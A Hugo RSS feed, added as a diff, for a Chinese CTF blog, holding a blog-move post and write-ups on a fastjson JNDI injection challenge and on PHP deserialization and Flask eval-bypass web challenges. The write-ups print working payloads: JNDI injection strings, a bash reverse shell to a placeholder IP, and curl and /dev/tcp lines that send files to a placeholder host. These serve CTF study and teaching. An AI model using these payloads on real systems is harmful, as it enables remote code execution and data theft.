@@ -1,0 +1,1499 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>k0a1i</title>
+        <link>https://example.com/</link>
+        <description>Recent content on k0a1i</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language><atom:link href="https://example.com/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>锵锵！博客搬新家ヾ(≧▽≦*)o</title>
+        <link>https://example.com/2023/new-blog/</link>
+        <pubDate>Fri, 10 Feb 2023 00:37:33 +0800</pubDate>
+        
+        <guid>https://example.com/2023/new-blog/</guid>
+        <description>&lt;img src="https://example.com/2023/new-blog/87c01ec7gy1fsnqqlbdzjj21kw0w07is.jpg" alt="Featured image of post 锵锵！博客搬新家ヾ(≧▽≦*)o" /&gt;&lt;blockquote&gt;
+&lt;p&gt;欢 迎 光 临 !&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;前几天突然想起自己还有个博客，虽然统共只写了四篇不成文的writeup记录，但好像也能够作为一个可以碎碎念的地方。于是吭哧吭哧开始搭建。原先用的hexo，挑的主题不是很好看，最近逛着逛着发现hugo的stack看起来很舒服，直接拿来用了。很久不敲代码，感觉审计起来很困难，着手装修的路应该会被我拖得老长&amp;hellip;&lt;/p&gt;
+&lt;p&gt;主题直接从&lt;a class=&#34;link&#34; href=&#34;https://mantyke.icu&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;小球飞鱼&lt;/a&gt;提供的&lt;a class=&#34;link&#34; href=&#34;https://github.com/Mantyke/Hugo-stack-theme-mod&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;仓库&lt;/a&gt;照搬,日后有时间再慢慢改。&lt;/p&gt;
+&lt;h2 id=&#34;原主题基础上的修改&#34;&gt;原主题基础上的修改&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;简单配置更改：文章最后更新时间、评论系统关闭&lt;/li&gt;
+&lt;li&gt;样式微调&lt;/li&gt;
+&lt;li&gt;这个mod新增的一些页面内容是写死的，手动调成模板调用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;todo&#34;&gt;TODO:&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; : 链接页、归档页样式更改&lt;/li&gt;
+&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; : 添加一些小动画&lt;/li&gt;
+&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; ：想到了再说&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;记录一些四处搜刮来的文章&#34;&gt;记录一些四处搜刮来的文章&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.loikein.one/posts/2021-05-11-hugo-draft-management/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;草稿管理&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://shuzang.github.io/2019/hugo-blog-article-write/#6-%E5%86%99%E4%BD%9C%E5%B7%A5%E5%85%B7&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;写作工具&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://fourxiajiao.github.io/2022/hugo-blog/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;hugo建站笔记&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;博客日后用途&#34;&gt;博客日后用途&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;日常WriteUp记录、技术学习笔记等等（技术博客真难写..希望新年坚持一下）&lt;/li&gt;
+&lt;li&gt;碎碎念杂记&lt;/li&gt;
+&lt;li&gt;想到再说&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>蓝帽杯2022</title>
+        <link>https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/</link>
+        <pubDate>Sat, 09 Jul 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/</guid>
+        <description>&lt;h3 id=&#34;写在前面&#34;&gt;写在前面&lt;/h3&gt;
+&lt;p&gt;很长时间没打比赛，生疏了很多。蓝帽杯的取证题很友好，好久没做出这么多题了哈哈哈哈哈哈哈哈，和pyy共同表示：虽然写了一堆水题，但是写了很多题！&lt;/p&gt;
+&lt;p&gt;不过这里主要记录一下fastjson的jndi注入流程。感谢高表哥的指导( •̀ ω •́ )✧&lt;/p&gt;
+&lt;h3 id=&#34;ez_gadget&#34;&gt;Ez_gadget&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;fastjson 1.2.62&lt;/p&gt;
+&lt;p&gt;需要：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;开启autotype&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;导入xbean-reflect-3.4.jar&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;入口：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 145; 
+			flex-basis: 349px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709213554716.png&#34; data-size=&#34;1180x811&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709213554716.png&#34;
+			width=&#34;1180&#34;
+			height=&#34;811&#34;
+			srcset=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709213554716_hu534e838f846fccbddc3459c3918a4bbf_99978_480x0_resize_box_3.png 480w, https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709213554716_hu534e838f846fccbddc3459c3918a4bbf_99978_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220709213554716&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220709213554716&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;在开始注入之前，需要绕过&lt;code&gt;hashCode()&lt;/code&gt;和&lt;code&gt;equals()&lt;/code&gt;的比较。java里，String类重写了Object的hashCode：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 161; 
+			flex-basis: 386px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709214050723.png&#34; data-size=&#34;598x371&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709214050723.png&#34;
+			width=&#34;598&#34;
+			height=&#34;371&#34;
+			srcset=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709214050723_hu2cfba9b8ca905884b9ca7e39bb888f11_25473_480x0_resize_box_3.png 480w, https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709214050723_hu2cfba9b8ca905884b9ca7e39bb888f11_25473_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220709214050723&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220709214050723&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;相关的解释和参考资料网上有很多。通俗来说，因为hashCode返回的是一个int，而且过程是对字符串分组执行加密的，所以解密过程同样可以进行拆分。原理是中间相遇攻击。网上找了生成的代码，拿给定的key直接生成就可以了。&lt;/p&gt;
+&lt;p&gt;接下来要考虑绕过正则，json是支持unicode编码的，所以可以把关键的内容用unicode编码代替，这里就全部编码替代了。&lt;/p&gt;
+&lt;p&gt;最后是fastjson注入。查看源码可以发现这个项目里导入了xbean-reflect-3.4.jar包，里面的&lt;code&gt;propertyeditor.JndiConverter&lt;/code&gt;类有可控点：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 258; 
+			flex-basis: 621px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709220927698.png&#34; data-size=&#34;616x238&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709220927698.png&#34;
+			width=&#34;616&#34;
+			height=&#34;238&#34;
+			srcset=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709220927698_hu74fafe9af80fa79b5f9d1ed2557dcd68_29474_480x0_resize_box_3.png 480w, https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709220927698_hu74fafe9af80fa79b5f9d1ed2557dcd68_29474_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220709220927698&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220709220927698&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;经典的jndi注入漏洞点，现成的payload也很多，找一个能用的：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&amp;quot;@type&amp;quot;:&amp;quot;org.apache.xbean.propertyeditor.JndiConverter&amp;quot;,&amp;quot;AsText&amp;quot;:&amp;quot;rmi://127.0.0.1:1099/exploit&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里本地环境就直接弹计算器了。弹shell的话把执行命令改成&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/xx.xx.xx.xx/1099 0&amp;gt;&amp;amp;1&lt;/code&gt;就行了。&lt;/p&gt;
+&lt;p&gt;同样也有&lt;a class=&#34;link&#34; href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;现成的工具&lt;/a&gt;（当然自己搭rmi也可以）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 192; 
+			flex-basis: 460px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709223610356.png&#34; data-size=&#34;1920x1000&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709223610356.png&#34;
+			width=&#34;1920&#34;
+			height=&#34;1000&#34;
+			srcset=&#34;https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709223610356_hu333bba61dd7ddfc08cdc1c8d1fc1b89b_534008_480x0_resize_box_3.png 480w, https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/image-20220709223610356_hu333bba61dd7ddfc08cdc1c8d1fc1b89b_534008_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220709223610356&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220709223610356&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;str=9P5JBmvCKwa8awgNWjY_gmj&amp;amp;input={&amp;quot;@type&amp;quot;:&amp;quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&amp;quot;,&amp;quot;AsText&amp;quot;:&amp;quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u003a\u0031\u0030\u0039\u0039\u002f\u007a\u0062\u007a\u0077\u0074\u0038&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;参考链接&#34;&gt;参考链接&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/zhanglong_4444/article/details/92592773&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;生成HashCode一致的字符串&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/god_zzZ/article/details/107122487&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/tr1ple/p/12348886.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Fastjson &amp;lt;=1.2.62 远程代码执行-漏洞复现&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/232774#h2-7&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;浅析Fastjson1.2.62-1.2.68反序列化漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/wyzxxz/jndi_tool&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;jndi_tool&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;JNDI-Injection-Exploit&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/942/#classreference-factory&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;如何绕过高版本 JDK 的限制进行 JNDI 注入利用&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://security.tencent.com/index.php/blog/msg/131&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;深入理解JNDI注入与Java反序列化漏洞利用&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;写在最后&#34;&gt;写在最后&lt;/h3&gt;
+&lt;p&gt;java题打的太少了，基本上看到java就放弃了，但是今天一步一步走下来收获还是蛮大的，虽然JNDI注入漏洞还是没有太明白。这一篇稍微记录一下打的过程，之后会开始复现各种JNDI注入的洞，慢慢把分析补上。包括各种工具的使用，在利用点上也有一定区别，这导致今天花了很多时间踩坑，之后一并写到总结里。&lt;/p&gt;
+&lt;p&gt;先开个坑，溜啦~&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>DASCTFxSUCTF-web-writeup</title>
+        <link>https://example.com/2022/dasctfxsuctf-web-writeup/</link>
+        <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://example.com/2022/dasctfxsuctf-web-writeup/</guid>
+        <description>&lt;h3 id=&#34;写在前面&#34;&gt;写在前面&lt;/h3&gt;
+&lt;p&gt;DASCTF没有好好打，作业太多了一直在赶ddl。但是好像确实不是很难的样子，写不出来果然还是我太菜了&amp;hellip;&lt;/p&gt;
+&lt;p&gt;以及，希望以后抽空多做做题叭(・∀・(・∀・(・∀・*)&lt;/p&gt;
+&lt;h3 id=&#34;ezpop&#34;&gt;ezpop&lt;/h3&gt;
+&lt;p&gt;先放源码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+class crow
+{
+    public $v1;
+    public $v2;
+
+    function eval() {
+        echo new $this-&amp;gt;v1($this-&amp;gt;v2);
+    }
+
+    public function __invoke()
+    {
+        $this-&amp;gt;v1-&amp;gt;world();
+    }
+}
+
+class fin
+{
+    public $f1;
+
+    public function __destruct()
+    {
+        echo $this-&amp;gt;f1 . &#39;114514&#39;;
+    }
+
+    public function run()
+    {
+        ($this-&amp;gt;f1)();
+    }
+
+    public function __call($a, $b)
+    {
+        echo $this-&amp;gt;f1-&amp;gt;get_flag();
+    }
+
+}
+
+class what
+{
+    public $a;
+
+    public function __toString()
+    {
+        $this-&amp;gt;a-&amp;gt;run();
+        return &#39;hello&#39;;
+    }
+}
+class mix
+{
+    public $m1;
+
+    public function run()
+    {
+        ($this-&amp;gt;m1)();
+    }
+
+    public function get_flag()
+    {
+        eval(&#39;#&#39; . $this-&amp;gt;m1);
+    }
+
+}
+
+if (isset($_POST[&#39;cmd&#39;])) {
+    unserialize($_POST[&#39;cmd&#39;]);
+}
+else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;太久没有写php的反序列化了，魔术方法怎么触发都忘得差不多了，所以翻出了&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/solitudi/article/details/113588692&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;y4的总结&lt;/a&gt;又跟着看了一遍（记性差真的好烦啊）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    __invoke() 在对象被作为函数调用时触发
+    __destruct() 在对象被销毁时触发
+    __call() 在调用未知或者不可访问的函数时触发
+    __toString() 在对象被作为字符串使用时触发(比如打印啦、拼接啦..)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;首先注意到mix类里面的get_flag函数里有一个eval，所以入口应该就是这里。于是可以反推出pop链应该怎么构造。&lt;/p&gt;
+&lt;p&gt;get_flag里面有一个eval函数,明显我们需要利用这个点进行命令执行.为了摸到这个eval,需要m1可控,还要执行get_flag();在fin里面调用__call可以使f1调用get_flag(),为了调用__call，可以利用crow里的__invoke，使v1调用未知函数而触发__call;为了调用__invoke,又需要将某个对象作为函数触发，这里可以使用fin的run或者mix的run;为了调用run，需要进到__toString里，但是触发这个__toString()又需要将对象作为字符串调用，所以自然就进入__destruct调用里面的字符串拼接。分析完以上的问题，就可以构造pop链了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;流程主要是:
+fin::_destruct()
+what::__toString()
+fin::run()/mix::run()
+crow::__invoke()
+fin::__call()
+mix::get_flag()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;所以定义如下的变量（也可以直接重新构造类）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$mix = new mix();
+$mix-&amp;gt;m1 = &amp;quot;\nsystem(&#39;whoami&#39;);&amp;quot;; // m1是需要拼接进eval的命令。
+$fin3 = new fin();
+$fin3-&amp;gt;f1 = $mix;
+$crow = new crow();
+$crow-&amp;gt;v1 = $fin3;
+//$mix2 = new mix(); 
+//$mix2-&amp;gt;m1 = $crow;
+$fin2 = new fin(); // 这里的fin2换成上面的mix2同样可以实现，效果一样的
+$fin2-&amp;gt;f1 = $crow;
+$what = new what();
+$what-&amp;gt;a = $fin2;
+$fin = new fin();
+$fin-&amp;gt;f1 = $what;
+
+echo serialize($fin);
+unserialize(serialize($fin));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里有一个点是eval里面拼接了注释符号&lt;code&gt;#&lt;/code&gt;，为了绕过这个注释，可以写入&lt;code&gt;\n&lt;/code&gt;来绕过。不过有一点比较坑的是hackbar不能传进换行，好像burp也不行，所以最后采用python发包打的远程。以及在这里遇到了php单引号和双引号字符转义的问题，我一定是最后一个知道php的单引号内字符串只转义斜杠和单引号的叭55555&lt;/p&gt;
+&lt;p&gt;对了，目录下面有很多的文件，其实只要执行&lt;code&gt;cat *&lt;/code&gt;，或者cat `ls` 就可以了，但是当时没注意，还以为flag放在其他的目录下面，我翻遍了都没找到。谁知道就在当前目录下面TT ( zyx : 都到这里了，肯定不会为难你的啦~ : )好叭&lt;/p&gt;
+&lt;h3 id=&#34;calc&#34;&gt;calc&lt;/h3&gt;
+&lt;p&gt;这道题其实完全没看..是赛后照着wp补的题，所以记录一下两种解法。都非常好，值得学习。&lt;/p&gt;
+&lt;p&gt;先贴上源码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding=utf-8
+from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
+import random
+from urllib import parse
+import os
+from werkzeug.utils import secure_filename
+import time
+
+
+app=Flask(__name__)
+
+def waf(s):
+    blacklist = [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&amp;quot;&#39;,&#39;{&#39;,&#39;}&#39;,&#39;&amp;amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]
+    flag = True
+    for no in blacklist:
+        if no.lower() in s.lower():
+            flag= False
+            print(no)
+            break
+    return flag
+    
+
+@app.route(&amp;quot;/&amp;quot;)
+def index():
+    &amp;quot;欢迎来到SUctf2022&amp;quot;
+    return render_template(&amp;quot;index.html&amp;quot;)
+
+@app.route(&amp;quot;/calc&amp;quot;,methods=[&#39;GET&#39;])
+def calc():
+    ip = request.remote_addr
+    num = request.values.get(&amp;quot;num&amp;quot;)
+    log = &amp;quot;echo {0} {1} {2}&amp;gt; ./tmp/log.txt&amp;quot;.format(time.strftime(&amp;quot;%Y%m%d-%H%M%S&amp;quot;,time.localtime()),ip,num)
+    
+    if waf(num):
+        try:
+            data = eval(num)
+            os.system(log)
+        except:
+            pass
+        return str(data)
+    else:
+        return &amp;quot;waf!!&amp;quot;
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    app.run(host=&#39;0.0.0.0&#39;,port=5000)  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里主要的考点是如何绕过eval()与os.system命令执行。因为黑名单里ban了很多很多东西，剩下的几乎没有多少（这里有一个习惯向二师傅学习，在碰到大量的黑名单过滤的时候，考虑它没有过滤的东西，再去找解题思路），但是剩下的东西都很有用，比如说&lt;code&gt;&#39;#&#39;,&#39;`&#39;,&#39;&amp;gt;&#39;,&#39;$&#39;,&amp;quot;&#39;&amp;quot;&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;所以先看看第一种解法。&lt;/p&gt;
+&lt;h4 id=&#34;解法一&#34;&gt;解法一&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;#&lt;/code&gt;在python里是注释符，后面跟着的内容会被注释掉不解析。所以如果传入的num是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1#123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过eval解析出来的内容就只是个1&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 160; 
+			flex-basis: 385px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328200628532.png&#34; data-size=&#34;236x147&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328200628532.png&#34;
+			width=&#34;236&#34;
+			height=&#34;147&#34;
+			srcset=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328200628532_huf6f7e5fd90b45b54a5d77a1a076f6a19_4221_480x0_resize_box_3.png 480w, https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328200628532_huf6f7e5fd90b45b54a5d77a1a076f6a19_4221_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220328200628532&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220328200628532&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这一点很神奇，原来python里面好多函数在解析字符串的时候会把注释符后面跟着的注释掉，查了很久资料也没有查到一个官方给的说法（好叭是我菜）&lt;/p&gt;
+&lt;p&gt;但是如果是os.system，传到shell里面会把&lt;code&gt;#&lt;/code&gt;看作字符而非注释符。所以尝试拼接这个&lt;code&gt;echo {0} {1} {2}&amp;gt; ./tmp/log.txt&lt;/code&gt;来让os.system执行。首先来看一下在bash里面的结果。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 647; 
+			flex-basis: 1554px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202428403.png&#34; data-size=&#34;680x105&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202428403.png&#34;
+			width=&#34;680&#34;
+			height=&#34;105&#34;
+			srcset=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202428403_hu7c0f1c0f9b3e05da76e046dc971ee22a_11676_480x0_resize_box_3.png 480w, https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202428403_hu7c0f1c0f9b3e05da76e046dc971ee22a_11676_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220328202428403&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220328202428403&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;执行之后，打开log.txt，可以看到反引号里面的命令被执行并且将结果输入log.txt了&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 282; 
+			flex-basis: 679px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202502583.png&#34; data-size=&#34;399x141&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202502583.png&#34;
+			width=&#34;399&#34;
+			height=&#34;141&#34;
+			srcset=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202502583_hu7e93c3657d040487e64cfc9542929a1e_7607_480x0_resize_box_3.png 480w, https://example.com/2022/dasctfxsuctf-web-writeup/image-20220328202502583_hu7e93c3657d040487e64cfc9542929a1e_7607_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220328202502583&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220328202502583&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;所以利用这一点，可以考虑传入一个可以让os.system执行的命令，尝试外带出结果。这里空格被过滤，可以考虑其他的空白符。&lt;/p&gt;
+&lt;p&gt;可以先写入再外带。&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;num = 1%23`ls%09/`%23
+num = 1%23`curl%09-F%09xx=@tmp/log.txt%09http://ip:port/`%23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;二师傅给的payload是直接外带。&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;num = 1%23%60%2Fbin%2Fbash%09-c%09%27cat%09.%2F*%3E%2Fdev%2Ftcp%2Fip%2Fport%27%60%3E
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;服务器这头监听一下就行。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 340; 
+			flex-basis: 818px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329171534234.png&#34; data-size=&#34;467x137&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329171534234.png&#34;
+			width=&#34;467&#34;
+			height=&#34;137&#34;
+			srcset=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329171534234_huc1e8c5937d28d3c7851b8bc325492717_10815_480x0_resize_box_3.png 480w, https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329171534234_huc1e8c5937d28d3c7851b8bc325492717_10815_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220329171534234&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220329171534234&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 2000; 
+			flex-basis: 4800px&#34;
+	&gt;
